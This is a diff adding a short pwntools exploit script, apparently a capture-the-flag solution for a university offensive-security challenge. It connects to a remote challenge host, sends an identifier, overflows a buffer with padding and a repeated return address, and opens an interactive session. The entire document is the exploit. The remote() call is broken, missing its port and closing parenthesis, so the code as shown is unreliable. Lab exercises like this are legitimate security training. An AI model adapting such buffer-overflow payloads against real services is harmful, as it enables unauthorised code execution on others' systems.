@@ -1,0 +1,12 @@
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+#p = process("./pwn")
+#gdb.attach(p)
+p=remote("offsec-chalbroker.osiris.cyber.nyu.edu",
+p.sendlineafter(":",'netid')
+sa = p.sendafter
+pay = b"".ljust(0x20,b'\0')+p64(0x40069D)*10
+sa(":",pay+b'\n')
+p.interactive()
+```
